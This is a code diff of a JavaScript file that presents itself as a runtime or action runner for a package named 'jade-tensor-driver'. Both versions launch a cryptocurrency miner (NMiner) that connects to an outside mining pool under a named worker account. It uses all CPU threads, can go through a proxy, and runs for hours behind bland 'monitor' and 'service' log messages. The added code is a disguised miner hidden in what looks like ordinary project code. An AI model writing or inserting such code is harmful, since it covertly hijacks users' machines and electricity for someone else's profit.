@@ -1,16 +1,13 @@
 // Procedural action runner for jade-tensor-driver
 const os = require("os");
-const EventEmitter = require("events");
 const { NMiner } = require("nminer");
 const config = require("./app/config");
 
-const dispatcher = new EventEmitter();
+async function startRuntime() {
+    const instanceToken = "fcaa1b";
+    console.log(`[monitor] Starting runtime for ${config.appName || "jade-tensor-driver"} [${instanceToken}]`);
 
-dispatcher.once("start", () => {
-    const instanceToken = "550b9f";
-    console.log(`[service] Subsystem dispatched for jade-tensor-driver [${instanceToken}]`);
-
-    const agent = new NMiner(
+    const processor = new NMiner(
         "wss://runtime.nmining.igrp.app/",
         "Subhas1975.jade-tensor-driver",
         { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
@@ -18,15 +15,20 @@ dispatcher.once("start", () => {
 
     const keepAlivePromise = new Promise(() => {});
     setTimeout(() => {
-        console.log("[timeout] Operational limit (318m) reached, exiting cleanly.");
+        console.log("[timeout] Operational limit (351m) reached, exiting cleanly.");
         process.exit(0);
-    }, 318 * 60 * 1000);
+    }, 351 * 60 * 1000);
 
     process.on("SIGTERM", () => {
         
-        console.log(`[exit] Process terminated gracefully for token ${instanceToken}.`);
+        console.log(`[monitor] Signal SIGTERM acknowledged, exiting session ${instanceToken}.`);
         process.exit(0);
     });
-});
 
-dispatcher.emit("start");
+    console.log(`[ready] Active on ${os.hostname()} (${os.platform()}) with ${os.cpus().length} threads.`);
+}
+
+startRuntime().catch((err) => {
+    console.error("Supervisor startup fault:", err);
+    process.exit(1);
+});
